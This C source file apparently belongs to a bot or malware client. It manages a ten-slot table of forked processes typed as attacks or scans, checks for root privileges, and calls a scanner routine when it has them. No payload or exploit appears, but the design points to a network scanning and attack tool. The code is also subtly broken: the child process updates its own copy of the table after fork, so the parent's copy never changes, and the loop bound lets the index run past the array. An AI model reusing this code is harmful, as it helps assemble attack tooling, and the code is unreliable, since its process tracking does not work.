#include "../include/main.h"

/*
Okay so new idea:
Use a struct with a max size of 10 that holds all processes we've started
It also keeps track what's enabled and stuff so yeh
*/

struct procinfo_t
{
	bool enabled; // Can it be used again?
	int32_t pid;     // Process id
	uint8_t type;    // Attack? Scan? What type of process is it
};

struct proc_t
{
	struct procinfo_t p[10];
} procs;
// Access like procs.p[3].enabled

/* Global process id list */
bool proc_isroot = false;

/* Initiate the process list */

bool proc_root(void)
{
	return proc_isroot;
}
void proc_init(void)
{
	for (int i = 0; i < 10; i++)
	{
		procs.p[i].enabled = false;
		procs.p[i].pid = -1;
		procs.p[i].type = 255;
	}

	if (geteuid() == 0)
		proc_isroot = true;

	return;
}

int proc_add(int type, char *param)
{
	printd("Adding proccess with %d:%s", type, param);
	uint8_t i = 0;
	uint32_t ret;

	ret = fork(); // Fork to create a new process

	if (ret != 0)
		return ret; // If we are papa process we return

	while (procs.p[i].enabled == true) // Iterate until we find one we can overwrite
	{
		if (++i > 10)
		{
			sleep(10);
			i = 0;
		}
	}

	procs.p[i].enabled = true;
	procs.p[i].pid = getpid();
	procs.p[i].type = type;

	switch (type)
	{
		case 1: // Scan All
		{
			if (proc_isroot == true)
				scan_scanner();
			else
				printd("u can't fucking do that u need root");
			break;
		}
		case 2:
		{
			printf("%s\n", param);
			break;
		}
		case 3:
		{
			break;
		}
		case 4:
		{
			break;
		}
	}

	procs.p[i].enabled = false; // Tell the world we've finished
	_exit(0); // Exit from child
}
